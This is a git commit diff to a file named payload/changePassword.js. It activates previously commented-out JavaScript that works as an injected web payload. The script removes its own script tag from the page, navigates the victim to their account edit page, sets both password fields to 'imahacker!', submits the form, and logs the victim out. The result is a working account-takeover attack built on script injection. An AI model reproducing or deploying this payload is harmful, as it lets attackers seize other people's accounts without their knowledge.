e3094b4b615879b5c29e12d3c6b74f02fd733e86
theultraman20 <32559038+theultraman20@users.noreply.github.com>
2018-04-02 01:25:38 -0400

    Update changePassword.js

--- payload/changePassword.js
+++ payload/changePassword.js
@@ -7,17 +7,19 @@ var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src="+src+">"));//the fi
 
 document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + ("<script src="+src+">").length );
 //now we do the payload: change their password!
-/*var passInputs;
+var passInputs;
 
-if (location.href == document.querySelector('.welcome-edit-link').href) {
-  passInputs = document.querySelectorAll("input[type=password]");
-  passInputs[0].value = "imahacker!";
-  passInputs[1].value = "imahacker!";
-  jQuery.cookie("logout", true);
-  document.querySelector("form")[1].submit();
-} else if (jQuery.cookie("logout")) {
-  location.pathname = "/user/logout";
-} else {
-  location.href = document.querySelector('.welcome-edit-link').href;
+var newPassword = "imahacker!";
+if (!jQuery("disabled")){
+  if (location.href == document.querySelector('.welcome-edit-link').href) {
+    passInputs = document.querySelectorAll("input[type=password]");
+    passInputs[0].value = newPassword;
+    passInputs[1].value = newPassword;
+    jQuery.cookie("logout", true);
+    document.querySelector("form")[1].submit();
+  } else if (jQuery.cookie("logout")) {
+    location.pathname = "/user/logout";
+  } else {
+    location.href = document.querySelector('.welcome-edit-link').href;
+  };
 };
-*/
